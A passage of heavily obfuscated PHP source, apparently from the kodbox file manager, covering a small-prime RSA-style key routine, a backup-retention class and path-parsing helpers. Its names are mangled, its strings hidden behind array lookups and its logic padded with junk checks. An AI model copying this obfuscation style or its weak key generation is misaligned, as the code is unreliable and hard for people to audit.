$®Éš›ô[812]; if (strlen($³»Ã¾ƒ) < $®Éš›ô[710]) { return; } while ($é®ÄÍâà % $Ïìôî±« != 0) { $¸„ôïô = $é®ÄÍâà; $é®ÄÍâà = $Ïìôî±«; $Ïìôî±« = $¸„ôïô % $Ïìôî±«; $°›³Õú = $®Éš›ô[813]; while (strlen($°›³Õú) < $®Éš›ô[710]) { if (!$°›³Õú) { break; } $°›³Õú++; } } if ($Ïìôî±« == 1) { break; } else { $ä«Â¡¾Ë++; } } $ÃŒÍß¼™ = 2; $·í‡¨ü“ = $®Éš›ô[814]; if (strlen($·í‡¨ü“) < $®Éš›ô[713]) { return; } for ($…·Š—¾¸ = 0; $…·Š—¾¸ < $û‚ŠµØ * 10; $…·Š—¾¸++) { if (($û‚ŠµØ * $…·Š—¾¸ + 1) % $ä«Â¡¾Ë == 0) { $ÃŒÍß¼™ = intval(($û‚ŠµØ * $…·Š—¾¸ + 1) / $ä«Â¡¾Ë); break; } } $¸Û—ò«Ì = $this->fpjb85ac07cc($Ôó«ŠÎó * $ şÆÌœÎ . $‡ÔÆúÖæ[6], $‡ÔÆúÖæ[136]); $’»’®ªú = $®Éš›ô[815]; if (strlen($’»’®ªú) < $®Éš›ô[701]) { die; } $ÃàûÛ¹ = md5($‡ÔÆúÖæ[305] . ($Ôó«ŠÎó + $ şÆÌœÎ) . $‡ÔÆúÖæ[306] . $ä«Â¡¾Ë . $‡ÔÆúÖæ[306] . $ÃŒÍß¼™ . $‡ÔÆúÖæ[307]); $»ìñ¬« = $this->fpjb85ac07cc($†›»½ˆ, $ÃàûÛ¹) . $‡ÔÆúÖæ[308] . $¸Û—ò«Ì; $£ã©­øü = $®Éš›ô[816]; if (strlen($£ã©­øü) < $®Éš›ô[480]) { return; } return $»ìñ¬«; } public function ukbfce62f632($»îöè) { $Ó°Á‚‘ =& $_SERVER[´‹ô¯Œ]; $Ã¯ğ¡œš =& $_SERVER[¢›»Ğ››]; $ßĞé®ù­ = explode($Ã¯ğ¡œš[308], $»îöè); if (count($ßĞé®ù­) != 2) { return $Ã¯ğ¡œš[6]; } $ö‘™•ú‹ = $this->amutcfe1ba17($ßĞé®ù­[1] . $Ã¯ğ¡œš[6], $Ã¯ğ¡œš[136]); $³Ù®ØòÙ = $Ó°Á‚‘[817]; while (strlen($³Ù®ØòÙ) < $Ó°Á‚‘[728]) { if (!$³Ù®ØòÙ) { break; } $³Ù®ØòÙ++; } if (!$ö‘™•ú‹) { return $Ã¯ğ¡œš[6]; } $ö‘™•ú‹ = intval($ö‘™•ú‹); $ÏÊ»¨Ğ = $Ó°Á‚‘[818]; if (!$ÏÊ»¨Ğ) { return; } $½Û¿ñˆÔ = 0; $íğ±šŸ = $Ó°Á‚‘[819]; if (strlen($íğ±šŸ) < $Ó°Á‚‘[713]) { return; } $èƒÒ±—¢ = 0; $ë×íÄˆ = $Ó°Á‚‘[820]; if (strlen($ë×íÄˆ) < $Ó°Á‚‘[701]) { return; } for ($Üå‡úÃ = 3; $Üå‡úÃ < $ö‘™•ú‹; $Üå‡úÃ += 2) { if ($ö‘™•ú‹ % $Üå‡úÃ != 0) { continue; } $½Û¿ñˆÔ = $Üå‡úÃ; $èƒÒ±—¢ = intval($ö‘™•ú‹ / $Üå‡úÃ); break; $ç¼„Ş‘· = $Ó°Á‚‘[821]; if (!$ç¼„Ş‘·) { die; } } $±ËÂ™Ë§ = ($½Û¿ñˆÔ - 1) * ($èƒÒ±—¢ - 1); $†—ø„Æ¬ = intval(($½Û¿ñˆÔ + $èƒÒ±—¢) / 2); $¸×µ¡êä = $Ó°Á‚‘[822]; if (!$¸×µ¡êä) { return; } while (1) { $©¿¾ŠÖ° = $†—ø„Æ¬; $ø÷ÀŠá® = $Ó°Á‚‘[823]; if (strlen($ø÷ÀŠá®) < $Ó°Á‚‘[480]) { return; } $İûö·¡ = $±ËÂ™Ë§; $±×¬Ÿî = $Ó°Á‚‘[824]; while ($İûö·¡ % $©¿¾ŠÖ° != 0) { $Øä’ØıÆ = $İûö·¡; $İûö·¡ = $©¿¾ŠÖ°; $ãŞÖ‡ = $Ó°Á‚‘[825]; while (strlen($ãŞÖ‡) < $Ó°Á‚‘[713]) { if (!$ãŞÖ‡) { break; } $ãŞÖ‡++; } $©¿¾ŠÖ° = $Øä’ØıÆ % $©¿¾ŠÖ°; $³Ù´ğÂ¯ = $Ó°Á‚‘[826]; if (strlen($³Ù´ğÂ¯) < $Ó°Á‚‘[701]) { return; } } if ($©¿¾ŠÖ° == 1) { break; } else { $†—ø„Æ¬++; } } $¤ë¯½— = 2; $µáî’›ø = $Ó°Á‚‘[827]; if (!$µáî’›ø) { return; } for ($Üå‡úÃ = 0; $Üå‡úÃ < $±ËÂ™Ë§ * 10; $Üå‡úÃ++) { if (($±ËÂ™Ë§ * $Üå‡úÃ + 1) % $†—ø„Æ¬ == 0) { $¤ë¯½— = intval(($±ËÂ™Ë§ * $Üå‡úÃ + 1) / $†—ø„Æ¬); break; } } $âŸàÖµó = md5($Ã¯ğ¡œš[305] . ($½Û¿ñˆÔ + $èƒÒ±—¢) . $Ã¯ğ¡œš[306] . $†—ø„Æ¬ . $Ã¯ğ¡œš[306] . $¤ë¯½— . $Ã¯ğ¡œš[307]); $å°üğ½ = $this->amutcfe1ba17($ßĞé®ù­[0], $âŸàÖµó); $Å’©Øªã = $Ó°Á‚‘[828]; if (strlen($Å’©Øªã) < $Ó°Á‚‘[710]) { die; } return $å°üğ½; } public function enrl7a55004e() { $ŸšÌÚ÷ =& $_SERVER[´‹ô¯Œ]; $€¡ßû«ƒ = mt_rand(pow(2, 14), pow(2, 16) - 1); $›ğóöÏÙ = array(); $ç„Ûä“ß = $ŸšÌÚ÷[829]; if (strlen($ç„Ûä“ß) < $ŸšÌÚ÷[713]) { die; } $ÜÔééÒï = 1; $†ˆ¼ïÂŒ = $ŸšÌÚ÷[830]; if (!$†ˆ¼ïÂŒ) { return; } while ($ÜÔééÒï <= (int) sqrt($€¡ßû«ƒ)) { $³…¨Ç×Ä = $ÜÔééÒï; while (!0) { $³…¨Ç×Ä++; if ($³…¨Ç×Ä <= 2) { $ÜÔééÒï = $³…¨Ç×Ä; break; } else { if ($³…¨Ç×Ä < 2) { continue; } } $±óá–— = !0; for ($ç¼ª¤³î = 2; $ç¼ª¤³î <= sqrt($³…¨Ç×Ä); $ç¼ª¤³î++) { if ($³…¨Ç×Ä % $ç¼ª¤³î == 0) { $±óá–— = !1; } } if ($±óá–—) { $ÜÔééÒï = $³…¨Ç×Ä; break; } } $›ğóöÏÙ[] = $ÜÔééÒï; } $Ìéîê = 2; $¤ÔèÔŠ¬ = $ŸšÌÚ÷[831]; for ($³…¨Ç×Ä = $€¡ßû«ƒ; $³…¨Ç×Ä > 1; $³…¨Ç×Ä--) { $±óá–— = !0; $úÎÅÄì— = $ŸšÌÚ÷[832]; if (strlen($úÎÅÄì—) < $ŸšÌÚ÷[710]) { return; } foreach ($›ğóöÏÙ as $Ë‰øğ) { if ($³…¨Ç×Ä % $Ë‰øğ == 0) { $±óá–— = !1; break; } } if ($±óá–—) { $Ìéîê = $³…¨Ç×Ä; break; } } return $Ìéîê; } public function phgc1d8d84f5($±Ü–ˆñŸ, $ã±Ü†ƒ×) { $¯ÙØŒ¯ =& $_SERVER[´‹ô¯Œ]; $«ïºê¸› =& $_SERVER[¢›»Ğ››]; return call_user_func(array($«ïºê¸›[8], $«ïºê¸›[309]), $±Ü–ˆñŸ, $ã±Ü†ƒ×); $ ŒÜ©¨´ = $¯ÙØŒ¯[833]; while (strlen($ ŒÜ©¨´) < $¯ÙØŒ¯[728]) { if (!$ ŒÜ©¨´) { break; } $ ŒÜ©¨´++; } } public function fpjb85ac07cc($¨ÕÚÜÀŠ, $â»…Ë›ª) { $ûêÄ„˜‘ =& $_SERVER[¢›»Ğ››]; return call_user_func(array($ûêÄ„˜‘[310], $ûêÄ„˜‘[311]), $¨ÕÚÜÀŠ, $â»…Ë›ª); } public function amutcfe1ba17($—„™•£ê, $ŞËÙ¬îŒ) { $‘™ÈÖÙ =& $_SERVER[¢›»Ğ››]; return call_user_func(array($‘™ÈÖÙ[310], $‘™ÈÖÙ[312]), $—„™•£ê, $ŞËÙ¬îŒ); $×Üùª÷ó = $_SERVER[´‹ô¯Œ][818]; if (!$×Üùª÷ó) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[´‹ô¯Œ][834]); $this->init(); $this->keep(); } public function init() { $Ÿñ‰ª =& $_SERVER[´‹ô¯Œ]; $this->isManual(); self::$name = date($Ÿñ‰ª[835]); if (!($Õâ—²£è = $this->model->lastItem())) { $Õâ—²£è = $this->initData(); } else { self::$name = $Õâ—²£è[$Ÿñ‰ª[32]]; if ($Õâ—²£è[$Ÿñ‰ª[836]] == $Ÿñ‰ª[91]) { self::$name = date($Ÿñ‰ª[262]); $Á¤œÒ“¦ = intval(_get($Õâ—²£è, $Ÿñ‰ª[837], 0)); if (self::$manual == 0 && $Õâ—²£è[$Ÿñ‰ª[32]] == self::$name) { $this->model->remove($Õâ—²£è[$Ÿñ‰ª[487]]); } $Õâ—²£è = $this->initData($Á¤œÒ“¦, $Õâ—²£è[$Ÿñ‰ª[838]]); } else { $this->checkStore($Õâ—²£è[$Ÿñ‰ª[838]]); } } self::$option = $Õâ—²£è; } private function isManual() { $ÀÓ±”ò¾ = _get($GLOBALS, $_SERVER[´‹ô¯Œ][839], 0); $ÀÓ±”ò¾ = intval($ÀÓ±”ò¾); self::$manual = $ÀÓ±”ò¾ && $ÀÓ±”ò¾ == 1 ? 1 : 0; } private function initData($âÑİÆÎ° = 0, $éÇ”„è = '') { $¥¯äâÀ =& $_SERVER[´‹ô¯Œ]; $ıÀò˜¤ = $this->model->config(); if ($éÇ”„è && $ıÀò˜¤[$¥¯äâÀ[838]] != $éÇ”„è) { $âÑİÆÎ° = 0; } $this->checkStore($ıÀò˜¤[$¥¯äâÀ[838]]); if (self::$manual == 1) { self::$name .= $¥¯äâÀ[11] . date($¥¯äâÀ[840]); } $à½–Ô÷ê = array($¥¯äâÀ[838] => $ıÀò˜¤[$¥¯äâÀ[838]], $¥¯äâÀ[32] => self::$name, $¥¯äâÀ[836] => 0, $¥¯äâÀ[171] => $ıÀò˜¤[$¥¯äâÀ[171]], $¥¯äâÀ[841] => self::$manual, $¥¯äâÀ[371] => array($¥¯äâÀ[842] => array($¥¯äâÀ[836] => 0), $¥¯äâÀ[843] => array($¥¯äâÀ[836] => 0, $¥¯äâÀ[844] => 0, $¥¯äâÀ[845] => 0, $¥¯äâÀ[33] => $¥¯äâÀ[12], $¥¯äâÀ[846] => 0, $¥¯äâÀ[847] => 0), $¥¯äâÀ[848] => array($¥¯äâÀ[836] => 0, $¥¯äâÀ[844] => 0, $¥¯äâÀ[845] => 0, $¥¯äâÀ[846] => 0, $¥¯äâÀ[847] => 0), $¥¯äâÀ[233] => array($¥¯äâÀ[836] => 0, $¥¯äâÀ[849] => 0, $¥¯äâÀ[850] => 0, $¥¯äâÀ[851] => 0, $¥¯äâÀ[852] => 0, $¥¯äâÀ[555] => $âÑİÆÎ°, $¥¯äâÀ[846] => 0, $¥¯äâÀ[847] => 0)), $¥¯äâÀ[846] => time(), $¥¯äâÀ[847] => 0); $ÄòÁ˜ì  = $this->model->insert($à½–Ô÷ê); $à½–Ô÷ê[$¥¯äâÀ[487]] = $ÄòÁ˜ì ; return $à½–Ô÷ê; } private function checkStore($½äµ™€Í) { $çİò—¦„ = Model($_SERVER[´‹ô¯Œ][853]); $®àÎàÎ¶ = $çİò—¦„->listData($½äµ™€Í); $çİò—¦„->checkConfig($®àÎàÎ¶); } public static function get() { if (!self::$option) { $ùÉ•ª» = Model($_SERVER[´‹ô¯Œ][834]); $åé¯Ê³– = $ùÉ•ª»->findByName(self::$name); $ùÉ•ª»->parseContent($åé¯Ê³–); self::$option = $åé¯Ê³–; } return self::$option; } public static function set($á¸ÀÀˆÀ) { $Œ¨¼É¥ò =& $_SERVER[´‹ô¯Œ]; $†ÈÑ¾¨Ô = self::get(); foreach ($á¸ÀÀˆÀ as $¸¢ƒÂ§á => $¢½Ã²ıÁ) { array_set_value($†ÈÑ¾¨Ô, $¸¢ƒÂ§á, $¢½Ã²ıÁ); } Model($Œ¨¼É¥ò[834])->update($†ÈÑ¾¨Ô[$Œ¨¼É¥ò[487]], $†ÈÑ¾¨Ô); self::$option = $†ÈÑ¾¨Ô; return self::$option; } public function keep() { $Ùª«‘è° =& $_SERVER[´‹ô¯Œ]; $óúé¹„– = self::get(); if (_get($óúé¹„–, $Ùª«‘è°[854], 0) == $Ùª«‘è°[91]) { return; } $this->backupKeep($óúé¹„–); self::set(array($Ùª«‘è°[854] => 1)); } private function backupKeep($¦³À¼ß) { $›õ•ß²ö =& $_SERVER[´‹ô¯Œ]; if (self::$manual == 1) { return; } $ñ»‰œ‹ = $this->model->listData(); if (empty($ñ»‰œ‹)) { return; } $»Á¸Í¼¡ = 0; $ÃàÅì­ª = array(); foreach ($ñ»‰œ‹ as $ÜûÈ¢ı¯) { if ($»Á¸Í¼¡ >= 7) { break; } $ÃàÅì­ª[] = $ÜûÈ¢ı¯[$›õ•ß²ö[32]]; $»Á¸Í¼¡++; } for ($»Á¸Í¼¡ = 0; $»Á¸Í¼¡ < 12; $»Á¸Í¼¡++) { $ÃàÅì­ª[] = date($›õ•ß²ö[855], strtotime("\55{$»Á¸Í¼¡}\x20\155\157\x6e\x74\x68\x73")); } $ÃàÅì­ª = array_unique($ÃàÅì­ª); $õ”¨çÌå = Model($›õ•ß²ö[856])->get($›õ•ß²ö[857]); foreach ($ñ»‰œ‹ as $ÜûÈ¢ı¯) { if (isset($ÜûÈ¢ı¯[$›õ•ß²ö[841]]) && $ÜûÈ¢ı¯[$›õ•ß²ö[841]] == $›õ•ß²ö[91]) { continue; } if (!empty($ÜûÈ¢ı¯[$›õ•ß²ö[32]]) && in_array($ÜûÈ¢ı¯[$›õ•ß²ö[32]], $ÃàÅì­ª)) { continue; } $this->model->remove($ÜûÈ¢ı¯[$›õ•ß²ö[487]]); $ì”€ª  = $this->backupPath($¦³À¼ß, $õ”¨çÌå); IO::remove($ì”€ª , !1); } } private function backupPath($ÜÖ—ŞˆÃ, $œ³ßÀò‹ = false) { $õÌ«´É¨ =& $_SERVER[´‹ô¯Œ]; if (!$œ³ßÀò‹) { $œ³ßÀò‹ = Model($õÌ«´É¨[856])->get($õÌ«´É¨[857]); } $£â¯·•å = $ÜÖ—ŞˆÃ[$õÌ«´É¨[32]]; $Ë³šÑÓŞ = substr(md5($õÌ«´É¨[858] . $œ³ßÀò‹ . $£â¯·•å), 0, 8); return "\173\151\157\72{$ÜÖ—ŞˆÃ[$õÌ«´É¨[838]]}\x7d\57\x64\141\x74\x61\142\x61\x73\x65\x2f\142\x61\x63\x6b\165\160\x2f" . $£â¯·•å . $õÌ«´É¨[11] . $Ë³šÑÓŞ; } public function db() { $üªŞ€±­ =& $_SERVER[´‹ô¯Œ]; $üê‡ åø = self::get(); if (_get($üê‡ åø, $üªŞ€±­[859], 0) == $üªŞ€±­[91]) { return !0; } $±Ø¦î× = new BackupDb(); if (!$±Ø¦î×->index()) { return !1; } self::set(array($üªŞ€±­[859] => 1)); return !0; } public function dbFile() { $”Šİø”Ù =& $_SERVER[´‹ô¯Œ]; $ô„åÇü¨ = self::get(); if (_get($ô„åÇü¨, $”Šİø”Ù[860], 0) == $”Šİø”Ù[91]) { return !0; } $ç¤ä’°â = new BackupDbFile(); if (!$ç¤ä’°â->index()) { return !1; } self::set(array($”Šİø”Ù[860] => 1)); return !0; } public function file() { $œ°İßß· =& $_SERVER[´‹ô¯Œ]; $úˆÜ°©ä = self::get(); if (_get($úˆÜ°©ä, $œ°İßß·[861], 0) == $œ°İßß·[91]) { return !0; } if ($úˆÜ°©ä[$œ°İßß·[171]] == $œ°İßß·[862]) { $è†©‰Âæ = new BackupFile(); if (!$è†©‰Âæ->index()) { return !1; } } self::set(array($œ°İßß·[861] => 1, $œ°İßß·[836] => 1)); return !0; } public static function log($ÉÕ¬Áµ) { write_log($ÉÕ¬Áµ, $_SERVER[´‹ô¯Œ][863]); } } goto f¨í—¢£ä‰; a¨ªµ–”˜Í: class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\165\x73\x65\162\x52\145\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\173\165\163\145\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\162\106\x69\x6c\x65\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\106\151\154\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\x70\122\x6f\x6f\x74\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\162\x53\150\141\x72\x65\x4c\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\x72\x65\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\x65\x49\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\x65\111\164\145\155\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\x68\175"; const KOD_BLOCK = "\173\142\x6c\157\143\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\145\162\122\x65\156\x63\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\151\x76\145\x72\175"; public static function typeList() { $àşƒõ =& $_SERVER[´‹ô¯Œ]; return array($àşƒõ[1353] => self::KOD_SOURCE, $àşƒõ[1354] => self::KOD_USER_RECYCLE, $àşƒõ[1355] => self::KOD_USER_FAV, $àşƒõ[1356] => self::KOD_USER_FILE_TAG, $àşƒõ[1357] => self::KOD_USER_FILE_TYPE, $àşƒõ[1358] => self::KOD_GROUP_ROOT_SELF, $àşƒõ[1359] => self::KOD_USER_SHARE, $àşƒõ[1360] => self::KOD_USER_SHARE_LINK, $àşƒõ[1361] => self::KOD_USER_SHARE_TO_ME, $àşƒõ[1362] => self::KOD_SHARE_ITEM, $àşƒõ[1363] => self::KOD_SHARE_LINK, $àşƒõ[1364] => self::KOD_SEARCH, $àşƒõ[1365] => self::KOD_BLOCK, $àşƒõ[1366] => self::KOD_IO, $àşƒõ[1367] => self::KOD_USER_RECENT, $àşƒõ[1368] => self::KOD_USER_DRIVER); } public static function parse($µ…®ÈÄø) { $èñíë‹ê =& $_SERVER[´‹ô¯Œ]; $µ…®ÈÄø = self::clear($µ…®ÈÄø); $Şé‰Ô” = array_values(self::typeList()); preg_match($èñíë‹ê[1369], $µ…®ÈÄø, $ªÄËÚÙ); $€Š¢Ì¡Ö = array($èñíë‹ê[508] => !1, $èñíë‹ê[1370] => !1, $èñíë‹ê[505] => !1, $èñíë‹ê[87] => $µ…®ÈÄø, $èñíë‹ê[1267] => !1, $èñíë‹ê[1266] => $èñíë‹ê[12]); if (is_array($ªÄËÚÙ) && count($ªÄËÚÙ) == 5) { $ˆ¥æš— = $èñíë‹ê[1371] . $ªÄËÚÙ[2] . $èñíë‹ê[405]; if (in_array($ˆ¥æš—, $Şé‰Ô”)) { $€Š¢Ì¡Ö[$èñíë‹ê[1267]] = $ªÄËÚÙ[1]; $€Š¢Ì¡Ö[$èñíë‹ê[33]] = $ˆ¥æš—; $€Š¢Ì¡Ö[$èñíë‹ê[1372]] = substr($ˆ¥æš—, 1, -1); $€Š¢Ì¡Ö[$èñíë‹ê[487]] = $ªÄËÚÙ[3]; } $€Š¢Ì¡Ö[$èñíë‹ê[1266]] = $ªÄËÚÙ[4]; } if ($€Š¢Ì¡Ö[$èñíë‹ê[508]] == self::KOD_SOURCE) { $€Š¢Ì¡Ö[$èñíë‹ê[1270]] = $€Š¢Ì¡Ö[$èñíë‹ê[487]]; } $æŒÄŠúÈ = array($èñíë‹ê[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $€Š¢Ì¡Ö[$èñíë‹ê[1335]] = in_array($€Š¢Ì¡Ö[$èñíë‹ê[33]], $æŒÄŠúÈ); return $€Š¢Ì¡Ö; } public static function isTruePath($«Áû¸äÙ) { $€è€İ¯ =& $_SERVER[´‹ô¯Œ]; if (substr($«Áû¸äÙ, 0, 1) != $€è€İ¯[1371]) { return !0; } if (strpos($«Áû¸äÙ, $€è€İ¯[495]) === 0) { return !0; } if (strpos($«Áû¸äÙ, $€è€İ¯[1339]) === 0) { return !0; } if (strpos($«Áû¸äÙ, $€è€İ¯[1373]) === 0) { return !0; } if (strpos($«Áû¸äÙ, $€è€İ¯[1374]) === 0) { return !0; } if (strpos($«Áû¸äÙ, $€è€İ¯[1375]) === 0) { return !0; } return !1; } public static function clear($ÓÂºåÀ˜) { $Â¿ÀãÓŸ =& $_SERVER[´‹ô¯Œ]; $ÓÂºåÀ˜ = str_replace(array($Â¿ÀãÓŸ[1171], $Â¿ÀãÓŸ[288]), $Â¿ÀãÓŸ[53], $ÓÂºåÀ˜); $ÓÂºåÀ˜ = str_replace($Â¿ÀãÓŸ[100], $Â¿ÀãÓŸ[8], $ÓÂºåÀ˜); $´¨²ØÌ‹ = $Â¿ÀãÓŸ[1376]; if (substr($ÓÂºåÀ˜, 0, 3) == $Â¿ÀãÓŸ[1377]) { $ÓÂºåÀ˜ = substr($ÓÂºåÀ˜, 3); } while (strstr($ÓÂºåÀ˜, $´¨²ØÌ‹)) { $ÓÂºåÀ˜ = str_replace($´¨²ØÌ‹, $Â¿ÀãÓŸ[8], $ÓÂºåÀ˜); } $ÓÂºåÀ˜ = preg_replace($Â¿ÀãÓŸ[1378], $Â¿ÀãÓŸ[8], $ÓÂºåÀ˜); if ($ÓÂºåÀ˜ == $Â¿ÀãÓŸ[8]) { return $Â¿ÀãÓŸ[8]; } $ÓÂºåÀ˜ = rtrim($ÓÂºåÀ˜, $Â¿ÀãÓŸ[8]); return $ÓÂºåÀ˜; } public static function pathTrue($µô×ïÈ×) { $‚ŸºşÎÉ =& $_SERVER[´‹ô¯Œ]; if (!$µô×ïÈ×) { return $‚ŸºşÎÉ[12]; } $µô×ïÈ× = str_replace($‚ŸºşÎÉ[257], $‚ŸºşÎÉ[8], str_replace($‚ŸºşÎÉ[1379], $‚ŸºşÎÉ[8], $µô×ïÈ×)); $µô×ïÈ× = str_replace($‚ŸºşÎÉ[257], $‚ŸºşÎÉ[8], str_replace($‚ŸºşÎÉ[1379], $‚ŸºşÎÉ[8], $µô×ïÈ×)); if (!strstr($µô×ïÈ×, $‚ŸºşÎÉ[1377])) { return $µô×ïÈ×; } $âåóµåÆ = explode($‚ŸºşÎÉ[8], $µô×ïÈ×); foreach ($âåóµåÆ as $÷ÈÃÜÆŠ => $à¤¬ë‘×) { if ($à¤¬ë‘× !== $‚ŸºşÎÉ[1380]) { continue; } for ($Ÿ…ÒĞƒ = $÷ÈÃÜÆŠ; $Ÿ…ÒĞƒ >= 0; $Ÿ…ÒĞƒ--) { if ($âåóµåÆ[$Ÿ…ÒĞƒ] === $‚ŸºşÎÉ[10] || $âåóµåÆ[$Ÿ…ÒĞƒ] === $‚ŸºşÎÉ[1380] || $âåóµåÆ[$Ÿ…ÒĞƒ] === -1) { continue; } if ($âåóµåÆ[$Ÿ…ÒĞƒ] === $‚ŸºşÎÉ[12]) { $âåóµåÆ[$÷ÈÃÜÆŠ] = -1; break; } $âåóµåÆ[$÷ÈÃÜÆŠ] = -1; $âåóµåÆ[$Ÿ…ÒĞƒ] = -1; break; } } $Ò•ñƒ’à = array(); foreach ($âåóµåÆ as $à¤¬ë‘×) { if ($à¤¬ë‘× !== -1) { $Ò•ñƒ’à[] = $à¤¬ë‘×; } } $£©é µÖ = implode($‚ŸºşÎÉ[8], $Ò•ñƒ’à); if (strpos($£©é µÖ, $‚ŸºşÎÉ[1381]) === 0) { $£©é µÖ = $‚ŸºşÎÉ[1377] . substr($£©é µÖ, strlen($‚ŸºşÎÉ[1381])); } return $£©é µÖ; } public static function pathUrlClear($ŠŞÀÍª) { $¨¿ØÌıõ =& $_SERVER[´‹ô¯Œ]; if (!$ŠŞÀÍª) { return $ŠŞÀÍª; } $ŠŞÀÍª = rawurldecode($ŠŞÀÍª); $ŠŞÀÍª = str_replace($¨¿ØÌıõ[1379], $¨¿ØÌıõ[8], $ŠŞÀÍª); if (strpos($ŠŞÀÍª, $¨¿ØÌıõ[76]) > 0) { $ŠŞÀÍª = substr($ŠŞÀÍª, 0, strpos($ŠŞÀÍª, $¨¿ØÌıõ[76])); } if (strpos($ŠŞÀÍª, $¨¿ØÌıõ[1382]) > 0) { $ŠŞÀÍª = substr($ŠŞÀÍª, 0, strpos($ŠŞÀÍª, $¨¿ØÌıõ[1382])); } return $ŠŞÀÍª; } public static function sourceID($§åÊ‡³Ë) { $Ã•İ°ü =& $_SERVER[´‹ô¯Œ]; $×Å±®Î÷ = self::parse($§åÊ‡³Ë); if ($×Å±®Î÷[$Ã•İ°ü[33]] !== self::KOD_SOURCE) { show_json(LNG($Ã•İ°ü[1383]), !1); } return $×Å±®Î÷[$Ã•İ°ü[487]]; } public static function make($Ÿ¨ºç) { if (!$Ÿ¨ºç) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ÿ¨ºç)); } public static function makeShare($Ì´ÉĞÆ, $æÎùÈÎ½) { return self::makePath(self::KOD_SHARE_ITEM, $Ì´ÉĞÆ, $æÎùÈÎ½); } public static function makeFileTypePath($¶ÕÀÖÜ•) { return self::makePath(self::KOD_USER_FILE_TYPE, $¶ÕÀÖÜ•); } public static function makeFileTagPath($¼ÂŠÕå) { return self::makePath(self::KOD_USER_FILE_TAG, $¼ÂŠÕå); } public static function makePath($ùÄ’òâ, $šå‘Å·º = '', $šÏÇì»È = '') { $•ùÓ·êá =& $_SERVER[´‹ô¯Œ]; $êâ÷Ò¶‘ = substr($ùÄ’òâ, 1, -1); $×±šÆ = $•ùÓ·êá[1384] . $êâ÷Ò¶‘ . $•ùÓ·êá[1385] . $šå‘Å·º . $•ùÓ·êá[1386]; $×±šÆ = $šÏÇì»È ? $×±šÆ . $šÏÇì»È . $•ùÓ·êá[8] : $×±šÆ; return $×±šÆ; } public static function hashPath($„‡Ú”Ê¬, $Ş½•°¶ƒ = false) { $Ÿ–Ï«ÕÏ =& $_SERVER[´‹ô¯Œ]; if (!$„‡Ú”Ê¬) { return $Ÿ–Ï«ÕÏ[12]; } $ÇÆ¯ô¦² = is_array($„‡Ú”Ê¬) ? $„‡Ú”Ê¬ : IO::info($„‡Ú”Ê¬); $•ü’ƒÉ = _get($ÇÆ¯ô¦², $Ÿ–Ï«ÕÏ[1387], $Ÿ–Ï«ÕÏ[12]); if (!$•ü’ƒÉ && isset($ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[238]])) { $•ü’ƒÉ = trim($ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[238]], $Ÿ–Ï«ÕÏ[121]); } if ($•ü’ƒÉ) { return $•ü’ƒÉ; } if (!$•ü’ƒÉ && isset($ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[194]]) && $ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[194]]) { $ÇÆ¯ô¦² = IO::info(KodIO::make($ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[194]])); $•ü’ƒÉ = _get($ÇÆ¯ô¦², $Ÿ–Ï«ÕÏ[1387], $Ÿ–Ï«ÕÏ[12]); } $äÚîÓê‘ = md5($ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[87]] . $ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[79]] . $ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[88]]); $´Îš—¾ = $äÚîÓê‘ . $Ÿ–Ï«ÕÏ[1388]; $•ü’ƒÉ = $•ü’ƒÉ ? $•ü’ƒÉ : Cache::get($´Îš—¾); if (!$•ü’ƒÉ && $Ş½•°¶ƒ) { $•ü’ƒÉ = IO::hashSimple($ÇÆ¯ô¦²[$Ÿ–Ï«ÕÏ[87]]); Cache::set($´Îš—¾, $•ü’ƒÉ ? $•ü’ƒÉ : $äÚîÓê‘, 3600 * 24 * 30); } return $•ü’ƒÉ ? $•ü’ƒÉ : $äÚîÓê‘; } public static function hashPathSafe($äé Š‡å, $Ğ§ÛèÄÉ = false) { $² –ú² =& $_SERVER[´‹ô¯Œ]; $ÎùÓæµ¦ = self::hashPath($äé Š‡å, $Ğ§ÛèÄÉ); return md5($ÎùÓæµ¦ . $² –ú²[1389] . Model($² –ú²[856])->get($² –ú²[857])); } public static function initSystemPath() { $äˆƒşÀ  =& $_SERVER[´‹ô¯Œ]; if (defined($äˆƒşÀ [1390])) { return; } define($äˆƒşÀ [1390], self::systemPath($äˆƒşÀ [192])); define($äˆƒşÀ [1391], self::systemPath($äˆƒşÀ [1392])); define($äˆƒşÀ [1393], self::systemPath($äˆƒşÀ [1394])); define($äˆƒşÀ [1395], self::systemPath($äˆƒşÀ [1396])); IOHistory::bindEvent(); } public static function systemPath($¤ù™–) { $Ëá¯ô¢ =& $_SERVER[´‹ô¯Œ]; $œ¹Ù°ß° = $Ëá¯ô¢[1397] . ucfirst($¤ù™–); $ïÓâÔëã = Model($Ëá¯ô¢[856])->get($œ¹Ù°ß°); if ($ïÓâÔëã) { return $ïÓâÔëã; } if ($¤ù™– == $Ëá¯ô¢[192]) { 